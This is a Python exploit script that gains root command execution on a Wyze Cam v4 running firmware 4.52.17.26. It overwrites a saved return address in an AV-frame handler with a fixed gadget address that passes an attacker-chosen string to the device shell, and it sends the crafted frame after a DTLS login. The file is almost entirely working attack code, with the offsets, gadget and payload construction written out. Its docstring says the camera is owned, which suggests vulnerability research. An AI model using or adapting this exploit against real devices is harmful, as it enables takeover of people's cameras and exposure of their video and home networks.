#!/usr/bin/env python3
"""One-shot root command on an owned Wyze Cam v4 via the AV tail over-read.

FUN_0067a0d4 stack-copies the tail of an AV frame at buffer+1023; saved RA sits at
tail[309], and tail[337] lands at caller_sp+0x18. Returning into 0x484E2C executes
`move a1,zero; jal exec_shell_sync; addiu a0,sp,0x18`, i.e. runs our string through
the shell as root. Non-PIE, so the address is stable on 4.52.17.26.

Usage: wyze_rootcmd.py IP MAC UID 'CMD' [--declared N] [--dry]
"""
import os, struct, sys, time
import dtlslib as d

GADGET = 0x00484E2C
MAGIC_RA_OFF = 309
CMD_OFF = 337
FIRST = 1023

def frame(cmd: bytes, declared: int) -> bytes:
    assert len(cmd) < declared - CMD_OFF, "command too long for declared size"
    body = bytearray(b"\x07\x01" + b"\x00" * 14 + struct.pack("<H", declared))
    body += b"\x00" * (FIRST - len(body))
    tail = bytearray(b"\x41" * declared)
    tail[MAGIC_RA_OFF:MAGIC_RA_OFF + 4] = struct.pack("<I", GADGET)
    tail[CMD_OFF:CMD_OFF + len(cmd) + 1] = cmd + b"\x00"
    return bytes(body) + bytes(tail)

def main() -> int:
    a = sys.argv[1:]
    if len(a) < 4:
        print(__doc__); return 2
    ip, mac, uid, cmd = a[0], a[1], a[2], a[3]
    declared = 500
    if "--declared" in a: declared = int(a[a.index("--declared") + 1])
    f = frame(cmd.encode(), declared)
    assert len(f) <= 2000, "frame would exceed a sane UDP payload"
    print(f"frame {len(f)}B, declared {declared}, cmd {len(cmd)}B")
    if "--dry" in a: return 0
    c = d.Cam2(ip, mac, uid, os.environ.get("ENR", ""), os.environ.get("IFACE", "0.0.0.0"))
    c.handshake()
    if not c.login():
        print("login failed"); return 1
    time.sleep(0.8)                      # let the encoder hand out a frame
    c.appdata(f)
    print("sent")
    time.sleep(1.0)
    return 0

if __name__ == "__main__":
    sys.exit(main())
